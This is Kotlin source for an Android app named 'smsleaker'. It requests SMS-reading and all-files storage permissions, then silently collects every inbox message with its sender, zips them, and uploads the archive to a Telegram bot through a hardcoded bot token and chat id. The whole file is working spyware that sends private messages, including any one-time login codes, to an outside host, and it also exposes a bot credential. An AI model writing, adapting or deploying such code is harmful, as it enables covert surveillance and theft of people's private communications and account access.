package com.example.smsleaker

import android.Manifest
//noinspection SuspiciousImport
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.github.kittinunf.fuel.core.FileDataPart
import com.github.kittinunf.fuel.httpUpload
import java.io.BufferedOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class MainActivity : AppCompatActivity() {

    private val SMS_PERMISSION_CODE = 1001
    private val MANAGE_STORAGE_PERMISSION_CODE = 1002

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Check for storage permission for Android 11 and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
            intent.data = Uri.parse("package:$packageName")
            startActivityForResult(intent, MANAGE_STORAGE_PERMISSION_CODE)
        } else {
            requestSmsPermission()
        }
    }

    private fun requestSmsPermission() {
        if (ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this, arrayOf(Manifest.permission.READ_SMS), SMS_PERMISSION_CODE
            )
        } else {
            processSmsAndSendToTelegram()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == SMS_PERMISSION_CODE && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            processSmsAndSendToTelegram()
        } else {
            Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show()
        }
    }

    private fun processSmsAndSendToTelegram() {
        val smsList = getAllSms()
        if (smsList.isNotEmpty()) {
            val zipFile = createZipFile(smsList)
            sendToTelegram(zipFile)
        } else {
//            Toast.makeText(this, "No SMS found", Toast.LENGTH_SHORT).show()
        }
    }

    private fun getAllSms(): List<String> {
        val smsList = mutableListOf<String>()
        val uri = Uri.parse("content://sms/inbox")
        val cursor = contentResolver.query(uri, null, null, null, null)

        cursor?.use {
            val indexBody = it.getColumnIndex("body")
            val indexAddress = it.getColumnIndex("address")
            while (it.moveToNext()) {
                val smsBody = it.getString(indexBody)
                val smsAddress = it.getString(indexAddress)
                smsList.add("From: $smsAddress\nMessage: $smsBody")
            }
        }

        return smsList
    }

    private fun createZipFile(smsList: List<String>): File {
        val fileName = "sms_backup.zip"
        val file = File(getExternalFilesDir(null), fileName)

        ZipOutputStream(BufferedOutputStream(FileOutputStream(file))).use { zipOut ->
            smsList.forEachIndexed { index, sms ->
                val entry = ZipEntry("sms_$index.txt")
                zipOut.putNextEntry(entry)
                zipOut.write(sms.toByteArray())
                zipOut.closeEntry()
            }
        }

        return file
    }

    private fun sendToTelegram(file: File) {
        val botToken = "6845327291:AAFaQMOFii44XYjqqjY7PsqapKgp564YQOE"
        val chatId = "5510162499"
        val telegramApiUrl = "https://api.telegram.org/bot$botToken/sendDocument"

        telegramApiUrl.httpUpload(parameters = listOf("chat_id" to chatId))
            .add { FileDataPart(file, name = "document") }.response { _, _, result ->
                result.fold(success = { data -> println("Success: $data") },
                    failure = { error -> println("Error: ${error.message}") })
            }
    }
}
